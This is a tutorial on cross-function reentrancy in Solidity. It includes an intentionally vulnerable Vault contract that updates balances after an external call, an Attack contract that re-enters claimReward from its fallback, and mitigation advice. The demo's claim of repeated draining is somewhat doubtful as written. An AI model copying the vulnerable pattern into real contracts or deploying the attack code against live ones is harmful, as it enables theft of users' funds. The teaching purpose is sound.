# Cross-Function Reentrancy in Solidity

### 📌 What is Reentrancy?

Reentrancy occurs when an external call made by a contract gives control back to the caller *before* the original function finishes execution.  
The attacker can then exploit inconsistent state to drain funds or bypass logic.

- **Single-function reentrancy** → attacker re-enters the *same* function (classic DAO hack, 2016).  
- **Cross-function reentrancy** → attacker re-enters *different* functions within the same contract, abusing shared state.

---

### ⚔️ Example Vulnerable Contract

```solidity
pragma solidity ^0.8.0;

contract Vault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Not enough balance");

        // ❌ State updated AFTER external call → vulnerable
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "ETH transfer failed");

        balances[msg.sender] -= amount;
    }

    function claimReward() external {
        // Rewards based on balance
        uint256 reward = balances[msg.sender] / 10;
        payable(msg.sender).transfer(reward);
    }
}
```
---
### 🚨 How Cross-Function Reentrancy Works
1. Attacker deposits some ETH.
2. Attacker calls `withdraw()`.
3. During the `call`, attacker’s fallback executes _before balances are updated_.
4. Instead of re-entering `withdraw()`, attacker re-enters `claimReward()`.
   - `balances[msg.sender]` still shows full balance.
   - Attacker drains rewards multiple times.

### 🕷️ Attack Contract

```solidity
pragma solidity ^0.8.0;

import "./Vault.sol";

contract Attack {
    Vault public target;

    constructor(address _target) {
        target = Vault(_target);
    }

    // Fallback gets control during withdraw()
    fallback() external payable {
        // Re-enter a different function (cross-function reentrancy)
        target.claimReward();
    }

    function pwn() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
}
```

### 🔑 Why It’s Dangerous
- Many devs only think about re-entering the _same function_.
- State shared across multiple functions (balances, reserves, governance votes) can be abused mid-transaction.
- Exploits extend beyond ETH transfers: **ERC20 hooks, voting power, reward multipliers, AMM reserves**.

### ✅ Mitigation Strategies
- **Checks-Effects-Interactions (CEI)**: Update state before calling external contracts.
- **Reentrancy Guards**: Use `nonReentrant` modifier (OpenZeppelin).
- **Separation of Concerns**: Don’t mix reward logic with withdrawals.
- **Pull Over Push**: Let users claim rewards separately, no implicit transfers.

### 📚 References
- [The DAO Hack (2016)](https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/)
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107/)
- [Solidity Security Considerations](https://docs.soliditylang.org/en/v0.8.20/security-considerations.html#re-entrancy)
